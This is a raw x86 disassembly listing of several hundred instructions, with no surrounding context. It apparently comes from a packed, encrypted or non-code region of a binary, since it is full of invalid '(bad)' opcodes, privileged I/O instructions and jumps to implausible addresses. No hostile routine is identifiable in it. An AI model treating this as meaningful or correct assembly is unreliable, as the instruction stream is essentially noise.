  40df82:	push   0x507e4915
  40df87:	std    
  40df88:	aaa    
  40df89:	pop    ebp
  40df8a:	or     edx,edi
  40df8c:	iret   
  40df8d:	int    0x44
  40df8f:	pop    ds
  40df90:	iret   
  40df91:	fsub   QWORD PTR fs:[ebx-0x4e]
  40df95:	pop    ss
  40df96:	les    esp,FWORD PTR [ebp+0x1ef83152]
  40df9c:	imul   ebx,DWORD PTR [ebx+0x4f],0xffffffa7
  40dfa0:	jnp    0x40df29
  40dfa2:	sub    dl,cl
  40dfa4:	pop    ebp
  40dfa5:	xor    BYTE PTR [ecx+0x2d],dh
  40dfa8:	push   0x2
  40dfaa:	iret   
  40dfab:	loope  0x40df48
  40dfad:	mov    al,0x58
  40dfaf:	cs sti 
  40dfb1:	(bad)  
  40dfb2:	imul   edi,DWORD PTR [edi+0x681522ad],0x6f
  40dfb9:	jno    0x40dfbb
  40dfbb:	jbe    0x40df8b
  40dfbd:	fcomip st,st(7)
  40dfbf:	sub    BYTE PTR [esi+0x0],ch
  40dfc2:	mov    edx,0x4a1f3a1e
  40dfc7:	cmp    eax,0xe3c0bec3
  40dfcc:	xor    ah,BYTE PTR [edi]
  40dfce:	daa    
  40dfcf:	mov    dh,0x2f
  40dfd1:	mov    dl,dh
  40dfd3:	loopne 0x40dfc2
  40dfd5:	jb     0x40df81
  40dfd7:	and    BYTE PTR [ecx-0x1efdbfdd],ch
  40dfdd:	add    BYTE PTR ds:0xfdb3c37b,cl
  40dfe3:	or     edi,DWORD PTR [esi-0x1f8852fc]
  40dfe9:	mov    ebx,ecx
  40dfeb:	jl     0x40e02b
  40dfed:	mov    ebp,DWORD PTR [ecx+0x73dc33d4]
  40dff3:	or     cl,al
  40dff5:	jne    0x40e04b
  40dff7:	push   edx
  40dff8:	sub    DWORD PTR [ebp-0x73c8c90e],esi
  40dffe:	mov    al,0x8
  40e000:	mov    ds:0x375cb5b7,al
  40e005:	arpl   di,di
  40e007:	mov    ebp,DWORD PTR [ecx-0x53]
  40e00a:	jl     0x40dfce
  40e00c:	les    ebp,FWORD PTR [esi-0x4bb30b49]
  40e012:	mov    ah,0x17
  40e014:	fmul   st,st(1)
  40e016:	sahf   
  40e017:	xor    ebx,DWORD PTR [esi]
  40e019:	push   0xffffffa5
  40e01b:	(bad)  
  40e01c:	cs xchg esi,edi
  40e01f:	sbb    esi,DWORD PTR [ebx+eiz*8-0x566140f9]
  40e026:	stos   DWORD PTR es:[edi],eax
  40e027:	clc    
  40e028:	shl    DWORD PTR [edi-0x7ba611ae],0xb3
  40e02f:	ret    0x7420
  40e032:	sbb    eax,0x7cfb57e5
  40e037:	mov    ecx,0x8024ae8
  40e03c:	mov    al,ds:0xe5b32bf
  40e041:	ss pushf 
  40e043:	add    al,0x43
  40e045:	rcr    BYTE PTR [esi-0x738df3d0],cl
  40e04b:	jne    0x40e0a6
  40e04d:	sub    ecx,ebx
  40e04f:	daa    
  40e050:	cwde   
  40e051:	jl     0x40e090
  40e053:	sar    DWORD PTR [ebp+0x6989e282],cl
  40e059:	scas   eax,DWORD PTR es:[edi]
  40e05a:	loope  0x40e0bb
  40e05c:	mov    ah,0xb
  40e05e:	jno    0x40e052
  40e060:	mov    ecx,DWORD PTR [ebp-0x69]
  40e063:	stos   DWORD PTR es:[edi],eax
  40e064:	mov    bl,0x45
  40e066:	push   edx
  40e067:	add    esp,ebx
  40e069:	add    bl,bl
  40e06b:	ret    0xa87c
  40e06e:	mov    ecx,0x7513dfca
  40e073:	jo     0x40e06e
  40e075:	cmp    BYTE PTR [ebx-0x788e8295],bh
  40e07b:	jmp    0x380439a
  40e080:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e081:	(bad)  
  40e082:	cmc    
  40e083:	sub    BYTE PTR [edx+edi*2+0x54a0a369],bh
  40e08a:	rcl    DWORD PTR [esi],0x4b
  40e08d:	(bad)  
  40e08e:	adc    eax,0x48c10c63
  40e093:	stc    
  40e094:	sbb    DWORD PTR [edx],0xaa8b218f
  40e09a:	fs lahf 
  40e09c:	sahf   
  40e09d:	adc    ecx,DWORD PTR [esi+0x78aa8355]
  40e0a3:	dec    ecx
  40e0a4:	inc    edi
  40e0a5:	and    eax,0x180f4870
  40e0aa:	push   ebx
  40e0ab:	sub    DWORD PTR [ecx+0x6c541efd],0xffffff8f
  40e0b2:	ins    DWORD PTR es:[edi],dx
  40e0b3:	ins    DWORD PTR es:[edi],dx
  40e0b4:	sbb    edx,ebx
  40e0b6:	dec    eax
  40e0b7:	fnstsw WORD PTR [ecx+0x33]
  40e0ba:	cmp    al,0xca
  40e0bc:	ss jo  0x40e05d
  40e0bf:	ret    
  40e0c0:	add    DWORD PTR [ecx-0x36c81195],ecx
  40e0c6:	add    al,BYTE PTR [esi+esi*8]
  40e0c9:	rcl    BYTE PTR [edx],cl
  40e0cb:	stc    
  40e0cc:	push   0xffffffe6
  40e0ce:	cmp    BYTE PTR [ecx],al
  40e0d0:	xchg   edx,eax
  40e0d1:	leave  
  40e0d2:	(bad)  [ebp-0x25911a1f]
  40e0d8:	aad    0x3
  40e0da:	xor    BYTE PTR [esi],bh
  40e0dc:	push   cs
  40e0dd:	retf   
  40e0de:	mov    ch,bl
  40e0e0:	jnp    0x40e0f7
  40e0e2:	pop    edi
  40e0e3:	cdq    
  40e0e4:	add    al,0xfe
  40e0e6:	pusha  
  40e0e7:	and    BYTE PTR [ecx+0x1b50291b],dl
  40e0ed:	push   ebp
  40e0ee:	sbb    cl,BYTE PTR [ebp-0x47c2fd64]
  40e0f4:	xor    esi,DWORD PTR fs:[ecx-0x727e799a]
  40e0fb:	popf   
  40e0fc:	mov    ?,WORD PTR [esi+0x7f]
  40e0ff:	xor    BYTE PTR [esi+edx*4-0x30],ah
  40e103:	push   0xfffffff3
  40e105:	repnz mov edi,0xc9a2f934
  40e10b:	in     eax,dx
  40e10c:	pop    eax
  40e10d:	add    al,0xdb
  40e10f:	sbb    ebp,edx
  40e111:	test   al,0x12
  40e113:	ins    BYTE PTR es:[edi],dx
  40e114:	add    BYTE PTR [eax+0x5e],0x3f
  40e118:	cmc    
  40e119:	and    BYTE PTR [eax-0x1d8114cc],bh
  40e11f:	pop    es
  40e120:	jbe    0x40e163
  40e122:	or     BYTE PTR [eax],ah
  40e124:	dec    ecx
  40e125:	or     eax,0xc5269bf4
  40e12a:	icebp  
  40e12b:	sub    edx,DWORD PTR [eax-0x63]
  40e12e:	cmp    edi,DWORD PTR [esi-0x71192a4a]
  40e134:	mov    esi,0x72ad6165
  40e139:	jns    0x40e0c6
  40e13b:	inc    eax
  40e13c:	sub    al,0x2f
  40e13e:	loopne 0x40e143
  40e140:	sti    
  40e141:	rcr    DWORD PTR [ebp+0x6a],cl
  40e144:	pop    edi
  40e145:	inc    edx
  40e146:	jg     0x40e14a
  40e148:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e149:	xor    eax,0xaf5f716b
  40e14e:	test   BYTE PTR [ecx+0x5e085500],bl
  40e154:	ss inc eax
  40e156:	mov    cl,0x45
  40e158:	and    al,0x18
  40e15a:	mov    eax,ds:0xd9f5a0d3
  40e15f:	and    eax,0xbf751cd1
  40e164:	xchg   edi,eax
  40e165:	mov    ah,0x89
  40e167:	bound  ebx,QWORD PTR [edx+0x34a13af2]
  40e16d:	dec    ebp
  40e16e:	icebp  
  40e16f:	mov    al,ds:0x3b332579
  40e174:	jmp    0x41508143
  40e179:	inc    ecx
  40e17a:	push   esp
  40e17b:	mov    eax,0x3e577b9c
  40e180:	out    0x47,eax
  40e182:	ret    0x38d9
  40e185:	mov    dh,BYTE PTR [ebx+esi*2-0xa]
  40e189:	or     edi,esp
  40e18b:	sub    bl,BYTE PTR es:[ecx]
  40e18e:	int    0x50
  40e190:	push   0xffffffb9
  40e192:	jae    0x40e191
  40e194:	addr16 (bad) 
  40e196:	dec    ebx
  40e197:	mov    bh,dh
  40e199:	cld    
  40e19a:	xchg   ecx,eax
  40e19b:	xchg   ebp,eax
  40e19c:	enter  0x6656,0xd7
  40e1a0:	stc    
  40e1a1:	and    eax,0xcc1ed69b
  40e1a6:	push   eax
  40e1a7:	gs mov bh,0x13
  40e1aa:	daa    
  40e1ab:	mov    ds:0x3f4bd35b,al
  40e1b0:	jecxz  0x40e15a
  40e1b2:	(bad)  
  40e1b3:	sbb    DWORD PTR [edx-0x7dedca9e],eax
  40e1b9:	and    dh,BYTE PTR ss:[edi-0x53ead460]
  40e1c0:	jmp    0xd604b182
  40e1c5:	xor    ecx,ebx
  40e1c7:	(bad)
  40e1cb:	mov    bl,0xc7
  40e1cd:	fimul  DWORD PTR [edi]
  40e1cf:	ins    DWORD PTR es:[edi],dx
  40e1d0:	xchg   esp,eax
  40e1d1:	out    0x11,eax
  40e1d3:	mov    eax,ds:0x6f4fd1f2
  40e1d8:	mov    ebx,0xd1d39b92
  40e1dd:	ror    DWORD PTR [ecx-0x366d386a],cl
  40e1e3:	sub    al,0x7a
  40e1e5:	ds hlt 
  40e1e7:	jb     0x40e225
  40e1e9:	lock mov cs,WORD PTR [ebx+edi*4+0x59]
  40e1ee:	jne    0x40e26a
  40e1f0:	jmp    0x14190bd1
  40e1f5:	pusha  
  40e1f6:	cmc    
  40e1f7:	call   0xad4d032a
  40e1fc:	or     dh,dl
  40e1fe:	mul    cl
  40e200:	add    ebx,edi
  40e202:	or     al,0xfe
  40e204:	aaa    
  40e205:	test   BYTE PTR [ebx+0x6483a220],bl
  40e20b:	cmp    esi,DWORD PTR [edx]
  40e20d:	mov    ah,0xaf
  40e20f:	mov    bh,0x95
  40e211:	or     al,0x34
  40e213:	dec    ecx
  40e214:	popf   
  40e215:	fisttp WORD PTR [ebx-0x3c]
  40e218:	push   ebp
  40e219:	mov    gs,WORD PTR [edi]
  40e21b:	sahf   
  40e21c:	cmp    BYTE PTR [edx-0x8225f8f],ch
  40e222:	xor    esi,DWORD PTR [ebx]
  40e224:	xor    BYTE PTR [edi-0x29],cl
  40e227:	fidivr WORD PTR [eax-0x6f24bb30]
  40e22d:	mov    esp,DWORD PTR [ebp-0x60]
  40e230:	test   al,0x55
  40e232:	fnstenv [edx+0x2e]
  40e235:	dec    esp
  40e236:	or     eax,0x73ad0c68
  40e23b:	cmp    esi,edx
  40e23d:	mov    esi,0x448dbef3
  40e242:	and    ah,BYTE PTR [esp+edi*1+0x6436e5b9]
  40e249:	scas   al,BYTE PTR es:[edi]
  40e24a:	stos   BYTE PTR es:[edi],al
  40e24b:	mov    eax,0xf6e4b419
  40e250:	pop    esi
  40e251:	xchg   ebp,eax
  40e252:	lock (bad) 
  40e254:	call   esp
  40e256:	and    esi,edx
  40e258:	sub    DWORD PTR [ebp+0x57],0x3c
  40e25c:	xor    BYTE PTR [esi],0x8a
  40e25f:	in     al,dx
  40e260:	add    al,BYTE PTR [edx-0x55]
  40e263:	mov    eax,0x81d37de8
  40e268:	shl    DWORD PTR [edx+0x4fc68424],1
  40e26e:	(bad)  
  40e26f:	idiv   BYTE PTR [esi]
  40e271:	xchg   ebp,eax
  40e272:	mov    WORD PTR [edi+0x4c],ds
  40e275:	ret    
  40e276:	out    dx,eax
  40e277:	dec    eax
  40e278:	pop    es
  40e279:	stos   DWORD PTR es:[edi],eax
  40e27a:	ds mov esi,0xe6eef51e
  40e280:	push   es
  40e281:	ret    0xdcd1
  40e284:	sub    eax,0x6360dd54
  40e289:	scas   al,BYTE PTR es:[edi]
  40e28a:	cmp    BYTE PTR [ecx+edi*2-0x4e],0x3d
  40e28f:	xchg   esp,eax
  40e290:	sar    DWORD PTR [esi-0x4e919926],0x9e
  40e297:	iret   
  40e298:	push   ss
  40e299:	pushf  
  40e29a:	mov    bl,0xc0
  40e29c:	push   ecx
  40e29d:	nop
  40e29e:	sub    BYTE PTR [ebp-0x61],al
  40e2a1:	(bad)  
  40e2a2:	xchg   ebp,eax
  40e2a3:	pop    ecx
  40e2a4:	arpl   di,di
  40e2a6:	loopne 0x40e24b
  40e2a8:	mov    dh,0x71
  40e2aa:	mov    dh,0xb5
  40e2ac:	mov    ah,0x2a
  40e2ae:	fst    QWORD PTR [ecx-0x4a667fac]
  40e2b4:	xor    DWORD PTR [ecx+0x35206686],edx
  40e2ba:	sub    DWORD PTR ds:0xaa733b7f,edx
  40e2c0:	and    al,0x72
  40e2c2:	push   esi
  40e2c3:	aas    
  40e2c4:	add    cl,BYTE PTR [ecx]
  40e2c6:	adc    al,BYTE PTR [ecx+0x2231ecd6]
  40e2cc:	aaa    
  40e2cd:	inc    edx
  40e2ce:	inc    eax
  40e2cf:	ss (bad) 
  40e2d2:	and    ebx,esi
  40e2d4:	dec    eax
  40e2d5:	fcomip st,st(1)
  40e2d7:	mov    edx,0xc8833cc1
  40e2dc:	mov    edx,0xc04de628
  40e2e1:	in     eax,dx
  40e2e2:	aad    0x19
  40e2e4:	add    edi,DWORD PTR [edi]
  40e2e6:	cmp    al,0x1c
  40e2e8:	inc    esi
  40e2e9:	aam    0x51
  40e2eb:	and    eax,0xb35fc207
  40e2f0:	(bad)
  40e2f3:	pop    esp
  40e2f4:	call   0xb27bb613
  40e2f9:	jns    0x40e329
  40e2fb:	(bad)  
  40e2fc:	mov    bl,0xe0
  40e2fe:	pop    ecx
  40e2ff:	ret    
  40e300:	les    esi,FWORD PTR [ebx]
  40e302:	jl     0x40e371
  40e304:	(bad)  
  40e305:	out    0xe8,eax
  40e307:	sub    eax,0x50c8badc
  40e30c:	jp     0x40e2e0
  40e30e:	mov    ebp,0x815974d8
  40e313:	and    al,0xd7
  40e315:	mov    esi,0x5a1267cd
  40e31a:	fdiv   st(7),st
  40e31c:	push   esp
  40e31d:	call   0x40fa:0xeba5da7d
  40e324:	hlt    
  40e325:	cmp    BYTE PTR [esi+0x14],al
  40e328:	adc    bh,0x23
  40e32b:	loopne 0x40e312
  40e32d:	cmp    eax,0xa0c092aa
  40e332:	ret    
  40e333:	push   esi
  40e334:	into   
  40e335:	mov    WORD PTR [ecx-0x1baeaf88],gs
  40e33b:	cmp    ebx,DWORD PTR [ebx]
  40e33d:	jno    0x40e2d5
  40e33f:	lds    ebp,FWORD PTR [ecx]
  40e341:	jnp    0x40e368
  40e343:	mov    ss,WORD PTR [esi+ebx*1-0x13027a2e]
  40e34a:	repz sub esi,DWORD PTR [ecx]
  40e34d:	mov    ecx,0x1a8d2689
  40e352:	adc    al,0xf9
  40e354:	inc    eax
  40e355:	ja     0x40e2ee
  40e357:	(bad)  
  40e358:	mov    ds:0x3d0475a,al
  40e35d:	mov    cl,0x12
  40e35f:	dec    edi
  40e360:	mov    ebx,0xd2d8f081
  40e365:	mov    WORD PTR [eax+edx*4+0x30025ca2],ds
  40e36c:	fxch   st(3)
  40e36e:	sbb    al,0x1c
  40e370:	pop    edx
  40e371:	test   eax,0x461163f6
  40e376:	dec    eax
  40e377:	fcmovu st,st(2)
  40e379:	fwait
  40e37a:	mov    al,0x22
  40e37c:	mov    ch,0xc4
  40e37e:	cpuid  
  40e380:	jge    0x40e387
  40e382:	xchg   ecx,eax
  40e383:	pop    ebx
  40e384:	adc    DWORD PTR [eax],0xffffff9d
  40e387:	lea    edi,[ebx-0x27]
  40e38a:	loope  0x40e378
  40e38c:	push   cs
  40e38d:	jae    0x40e3b1
  40e38f:	inc    eax
  40e390:	dec    ebp
  40e391:	sar    dh,cl
  40e393:	stc    
  40e394:	addr16 pop ss
  40e396:	bound  esi,QWORD PTR [ebx+0x162d7153]
  40e39c:	popf   
  40e39d:	pop    esi
  40e39e:	jecxz  0x40e3f3
  40e3a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3a1:	leave  
  40e3a2:	mov    bl,0x4d
  40e3a4:	inc    edx
  40e3a5:	addr16 inc esp
  40e3a7:	outs   dx,DWORD PTR ds:[esi]
  40e3a8:	sbb    al,0xbf
  40e3aa:	inc    ebx
  40e3ab:	adc    BYTE PTR [ebp-0x44],dl
  40e3ae:	mov    cl,0xa
  40e3b0:	and    esi,esp
  40e3b2:	and    eax,0xffffff9d
  40e3b5:	int3   
  40e3b6:	dec    esi
  40e3b7:	adc    DWORD PTR [ebp-0x60],ebx
  40e3ba:	mov    ecx,0x1dc4a4c7
  40e3bf:	cmp    al,BYTE PTR [eax+0x1c531270]
  40e3c5:	fcomp  st(3)
  40e3c7:	dec    esi
  40e3c8:	inc    edx
  40e3c9:	cmp    edx,edi
  40e3cb:	xchg   ebp,ebp
  40e3cd:	dec    esp
  40e3ce:	add    al,0xe2
  40e3d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e3d1:	ins    DWORD PTR es:[edi],dx
  40e3d2:	bound  ebp,QWORD PTR [ebx+0x3b24d212]
  40e3d8:	cmp    DWORD PTR [eax+0x101da337],0x6c5fc958
  40e3e2:	or     dl,BYTE PTR [edx+eax*8-0x25cec988]
  40e3e9:	dec    ebx
  40e3ea:	fwait
  40e3eb:	and    eax,0x8ea5575b
  40e3f0:	jmp    0x40e44f
  40e3f2:	in     eax,0xe1
  40e3f4:	mov    ds:0x37831bde,eax
  40e3f9:	push   0xee893eaf
  40e3fe:	xchg   ch,ch
  40e400:	fnstsw WORD PTR [ebx+edi*4+0x275c5733]
  40e407:	sbb    DWORD PTR [ecx],0xffffff8b
  40e40a:	jb     0x40e3a7
  40e40c:	and    bh,dl
  40e40e:	adc    eax,0x254cdd7c
  40e413:	bound  ebp,QWORD PTR [ebx]
  40e415:	jns    0x40e3fe
  40e417:	std    
  40e418:	jnp    0x40e3f6
  40e41a:	cdq    
  40e41b:	sub    BYTE PTR [edx],ch
  40e41d:	jmp    0xc2da:0x6759b0a1
  40e424:	inc    ebx
  40e425:	mov    ebp,0xe09cdeca
  40e42a:	pop    ds
  40e42b:	mov    eax,0xd1ead9b2
  40e430:	cmp    eax,0x35ddf1f4
  40e435:	adc    eax,0x1f5d3c3b
  40e43a:	aas    
  40e43b:	dec    edi
  40e43c:	sub    al,0xb4
  40e43e:	sub    BYTE PTR [edx+0x14],0x7e
  40e442:	xor    DWORD PTR ds:[edx+eiz*4],0x7ecbc51d
  40e44a:	inc    ebp
  40e44b:	aam    0x3e
  40e44d:	pop    eax
  40e44e:	add    eax,0xb4dc5ab4
  40e453:	pop    esi
  40e454:	dec    edi
  40e455:	jp     0x40e3da
  40e457:	and    al,0xfa
  40e459:	ins    BYTE PTR es:[edi],dx
  40e45a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e45b:	adc    DWORD PTR [ebp+0x51f6d734],0xd0da43ea
  40e465:	mov    ecx,0x13848efc
  40e46a:	test   DWORD PTR ds:0x173ca25c,ecx
  40e470:	jle    0x40e4c0
  40e472:	push   cs
  40e473:	jge    0x40e49c
  40e475:	or     al,0xb7
  40e477:	mov    ds:0x22fadf9f,al
  40e47c:	jmp    0xbae:0x4d2a18bf
  40e483:	mov    ds:0x2b34d675,al
  40e488:	push   edx
  40e489:	push   edx
  40e48a:	dec    ebx
  40e48b:	fnstsw WORD PTR [eax-0x64]
  40e48e:	push   ss
  40e48f:	scas   al,BYTE PTR es:[edi]
  40e490:	loopne 0x40e4f9
  40e492:	loop   0x40e4c7
  40e494:	xchg   ebp,eax
  40e495:	xchg   ebp,eax
  40e496:	mov    ecx,0x1a2ff839
  40e49b:	les    ecx,FWORD PTR [eax+0x25a3027]
  40e4a1:	imul   ebx,eax,0x39
  40e4a4:	xchg   ebp,eax
  40e4a5:	imul   ebx,DWORD PTR [eax+eax*2-0x2b],0xffffff9b
  40e4aa:	xchg   DWORD PTR [esi],ebp
  40e4ac:	inc    ebp
  40e4ad:	jae    0x40e4bf
  40e4af:	push   0x4c
  40e4b1:	sbb    edi,edi
  40e4b3:	dec    edx
  40e4b4:	jbe    0x40e49c
  40e4b6:	and    al,0x28
  40e4b8:	add    BYTE PTR [edi+0x363a7563],ch
  40e4be:	in     eax,dx
  40e4bf:	mov    cl,0xcc
  40e4c1:	gs dec edi
  40e4c3:	add    BYTE PTR [eax-0x14],cl
  40e4c6:	jle    0x40e458
  40e4c8:	xchg   ecx,eax
  40e4c9:	(bad)  
  40e4ca:	jns    0x40e48a
  40e4cc:	aaa    
  40e4cd:	inc    edi
  40e4ce:	cmp    cl,BYTE PTR [edx+0x10559b3e]
  40e4d4:	and    DWORD PTR [ebp-0x15],eax
  40e4d7:	jo     0x40e48b
  40e4d9:	jp     0x40e4bf
  40e4db:	mov    ebx,es
  40e4dd:	or     al,BYTE PTR [ecx-0x67cbd0e1]
  40e4e3:	and    eax,0x5e166211
  40e4e8:	test   DWORD PTR ds:[eax+0x7],eax
  40e4ec:	mov    esi,0x5db9cbb6
  40e4f1:	les    ebp,FWORD PTR [eax]
  40e4f3:	push   0xffffffd8
  40e4f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e4f6:	cmp    BYTE PTR [ebx-0x10bc3f73],dl
  40e4fc:	rol    dl,1
  40e4fe:	jg     0x40e48c
  40e500:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e501:	out    0x6,eax
  40e503:	pop    edx
  40e504:	fdivr  QWORD PTR [ebp+0x6e]
  40e507:	enter  0xe5be,0xcf
  40e50b:	jmp    0xc2b8a82b
  40e510:	pop    esi
  40e511:	stos   BYTE PTR es:[edi],al
  40e512:	mov    dh,0xbd
  40e514:	hlt    
  40e515:	inc    ecx
  40e516:	pop    edx
  40e517:	ins    DWORD PTR es:[edi],dx
  40e518:	int3   
  40e519:	mov    eax,esp
  40e51b:	aad    0x55
  40e51d:	rol    BYTE PTR [ebp+0x16],0x24
  40e521:	xchg   ebx,edx
  40e523:	add    DWORD PTR [edx-0xb520dee],esp
  40e529:	sub    ch,ch
  40e52b:	call   0x1d93:0xbe91960
  40e532:	je     0x40e55d
  40e534:	loopne 0x40e4ee
  40e536:	int3   
  40e537:	outs   dx,DWORD PTR ds:[esi]
  40e538:	xchg   ecx,eax
  40e539:	add    ecx,DWORD PTR [ecx-0x46]
  40e53c:	pushf  
  40e53d:	adc    bh,ch
  40e53f:	cmp    eax,DWORD PTR [ebp-0x13]
  40e542:	add    ebp,DWORD PTR [ecx]
  40e544:	pop    esp
  40e545:	sbb    DWORD PTR [ebx],ebp
  40e547:	xor    eax,0x8c0848ec
  40e54c:	in     al,dx
  40e54d:	arpl   WORD PTR [ecx],bp
  40e54f:	mov    esi,0xe000229b
  40e554:	cli    
  40e555:	ins    BYTE PTR es:[edi],dx
  40e556:	dec    edx
  40e557:	int    0x94
  40e559:	pop    ds
  40e55a:	push   0x77fa0403
  40e55f:	cmp    BYTE PTR ds:0x84d6bc72,cl
  40e565:	ins    DWORD PTR es:[edi],dx
  40e566:	fistp  QWORD PTR [ecx-0x30]
  40e569:	(bad)  
  40e56a:	mov    cs,WORD PTR [esi+edi*2-0x3e]
  40e56e:	fsubr  QWORD PTR [ecx]
  40e570:	fcom   DWORD PTR [ebp+eiz*8-0xd4fe74]
  40e577:	mov    eax,0xec5cc328
  40e57c:	fcmovnbe st,st(3)
  40e57e:	push   ebp
  40e57f:	jae    0x40e5a6
  40e581:	mov    esi,0xfa5c3ccb
  40e586:	and    al,0xf6
  40e588:	sub    dl,0x5f
  40e58b:	xor    al,BYTE PTR [ecx]
  40e58d:	mov    eax,0x5139f683
  40e592:	mov    ebp,0x507c8949
  40e597:	adc    eax,0xa46a0949
  40e59c:	push   edx
  40e59d:	pop    ebx
  40e59e:	pop    edi
  40e59f:	mov    DWORD PTR [ebx],esp
  40e5a1:	ror    DWORD PTR ds:0x23d00dd4,0xb
  40e5a8:	mov    dl,0x2d
  40e5aa:	mov    DWORD PTR [ebx+0xf],eax
  40e5ad:	fadd   DWORD PTR [edi]
  40e5af:	test   eax,0xad70e66e
  40e5b4:	mov    edx,0xa0301f29
  40e5b9:	fisub  DWORD PTR [ecx]
  40e5bb:	dec    eax
  40e5bc:	mov    al,ds:0xe42baec4
  40e5c1:	inc    esp
  40e5c2:	or     dh,BYTE PTR ds:0x6467a3f4
  40e5c8:	enter  0x3a9e,0x81
  40e5cc:	sub    dh,BYTE PTR [esi+edi*2-0x54b56020]
  40e5d3:	outs   dx,BYTE PTR ds:[esi]
  40e5d4:	add    bh,dl
  40e5d6:	pop    ebp
  40e5d7:	and    eax,0x69f68b80
  40e5dc:	div    edx
  40e5de:	push   es
  40e5df:	jne    0x40e5c1
  40e5e1:	xchg   esp,eax
  40e5e2:	jg     0x40e5af
  40e5e4:	dec    eax
  40e5e5:	mov    esi,0x5c9b5df1
  40e5ea:	shr    BYTE PTR [ebx-0x13d8d278],1
  40e5f0:	jl     0x40e57d
  40e5f2:	(bad)  
  40e5f3:	(bad)  
  40e5f5:	out    dx,al
  40e5f6:	jp     0x40e637
  40e5f8:	push   esp
  40e5f9:	retf   
  40e5fa:	pop    ebx
  40e5fb:	sbb    esp,edx
  40e5fd:	in     al,0xda
  40e5ff:	xchg   edx,eax
  40e600:	sbb    DWORD PTR [eax-0x4ec02f9f],ebp
  40e606:	ins    DWORD PTR es:[edi],dx
  40e607:	pop    es
  40e608:	lahf   
  40e609:	cmp    bl,al
  40e60b:	mov    edi,0x6506d45f
  40e610:	ret    
  40e611:	outs   dx,DWORD PTR ds:[esi]
  40e612:	add    eax,0x394d598c
  40e617:	daa    
  40e618:	jae    0x40e652
  40e61a:	fwait
  40e61b:	es mov al,0x2
  40e61e:	je     0x40e5b0
  40e620:	data16 cmp ch,BYTE PTR [ebp+0x0]
  40e624:	fsub   DWORD PTR [edi]
  40e626:	inc    ebp
  40e627:	sub    al,0x1c
  40e62a:	pop    esp
  40e62b:	inc    edx
  40e62c:	and    dl,dh
  40e62e:	lods   al,BYTE PTR ds:[esi]
  40e62f:	mov    ah,0xc0
  40e631:	push   0xffffffc9
  40e633:	imul   esi,ebx,0x46d92100
  40e639:	xlat   BYTE PTR ds:[ebx]
  40e63a:	cwde   
  40e63b:	in     eax,0x70
  40e63d:	push   cs
  40e63e:	mov    ss,eax
  40e640:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e641:	ins    BYTE PTR es:[edi],dx
  40e642:	bound  esi,QWORD PTR [edi]
  40e644:	inc    edx
  40e645:	xchg   BYTE PTR [ebx+edi*1-0x48],dh
  40e649:	pushf  
  40e64a:	sbb    BYTE PTR [eax-0x499e29f8],bl
  40e650:	sbb    eax,0x498e4134
  40e655:	sbb    BYTE PTR [ecx-0x2b],0x2d
  40e659:	cmp    DWORD PTR [ecx-0x4a],0xa0bf4661
  40e660:	dec    ebp
  40e661:	vphadddq xmm14,XMMWORD PTR [eax+r15d*8]
  40e667:	add    ah,dh
  40e669:	test   eax,0x8f45d72b
  40e66e:	out    0x9d,eax
  40e670:	push   ecx
  40e671:	and    ebx,DWORD PTR [ecx+0x609a6c6e]
  40e677:	popf   
  40e678:	jp     0x40e6dc
  40e67a:	xorps  xmm1,XMMWORD PTR [ebx-0x80]
  40e67e:	arpl   WORD PTR [eax-0x32],bp
  40e681:	ins    BYTE PTR es:[edi],dx
  40e682:	mov    edi,0xc30ecc4d
  40e687:	sbb    DWORD PTR [ebx],ecx
  40e689:	push   eax
  40e68a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e68b:	clc    
  40e68c:	adc    BYTE PTR [ecx-0x19],al
  40e68f:	enter  0xfab7,0x63
  40e693:	pop    ss
  40e694:	dec    eax
  40e695:	mov    WORD PTR [ecx+edx*8-0x1e54d97e],ss
  40e69c:	mov    bl,0x1c
  40e69e:	mov    eax,ds:0xc2145ffa
  40e6a3:	and    esp,DWORD PTR [esi+eiz*8-0x25]
  40e6a7:	pop    ss
  40e6a8:	imul   esi,DWORD PTR [ebp+0xd],0xffffff94
  40e6ac:	sbb    eax,0x215cc548
  40e6b1:	mov    ds:0x4f23b466,al
  40e6b6:	and    eax,0xb1018c39
  40e6bb:	daa    
  40e6bc:	ja     0x40e727
  40e6be:	fmul   QWORD PTR [edi-0x32]
  40e6c1:	(bad)  
  40e6c2:	jo     0x40e67c
  40e6c4:	mov    ebp,DWORD PTR [edx-0x33]
  40e6c7:	adc    DWORD PTR [ecx-0x56947cd8],ebx
  40e6cd:	lea    ebx,[ecx]
  40e6cf:	scas   al,BYTE PTR es:[edi]
  40e6d0:	cmp    edi,esp
  40e6d2:	(bad)  
  40e6d3:	jae    0x40e66b
  40e6d5:	inc    ebp
  40e6d6:	scas   eax,DWORD PTR es:[edi]
  40e6d7:	sub    ebp,DWORD PTR [esi+edx*2-0x24]
  40e6db:	mov    dl,0x26
  40e6dd:	push   ds
  40e6de:	sub    BYTE PTR [edi+ebx*2],bh
  40e6e1:	or     al,0xab
  40e6e3:	dec    esi
  40e6e4:	es mov ch,0xfc
  40e6e7:	inc    eax
  40e6e8:	adc    DWORD PTR [eax],0x27
  40e6eb:	fsub   QWORD PTR [eax]
  40e6ed:	sbb    al,0xfb
  40e6ef:	push   ebp
  40e6f0:	or     ah,dl
  40e6f2:	imul   ecx,DWORD PTR [esi],0xffffffa3
  40e6f5:	xchg   edx,eax
  40e6f6:	mov    bh,0xd0
  40e6f8:	inc    eax
  40e6f9:	cli    
  40e6fa:	rol    edx,cl
  40e6fc:	inc    esp
  40e6fd:	out    dx,eax
  40e6fe:	mov    ah,0x3f
  40e700:	sbb    eax,DWORD PTR [edx-0x33]
  40e703:	jne    0x40e748
  40e705:	sahf   
  40e706:	pop    edx
  40e707:	add    ch,0x17
  40e70a:	retf   
  40e70b:	(bad)  
  40e70c:	cld    
  40e70d:	cmp    eax,0x96e83053
  40e712:	cs mov eax,0x9cf3fbbf
  40e718:	scas   al,BYTE PTR es:[edi]
  40e719:	int3   
  40e71a:	aam    0xea
  40e71c:	mov    ah,0x2d
  40e71e:	dec    ebp
  40e71f:	cmp    dh,al
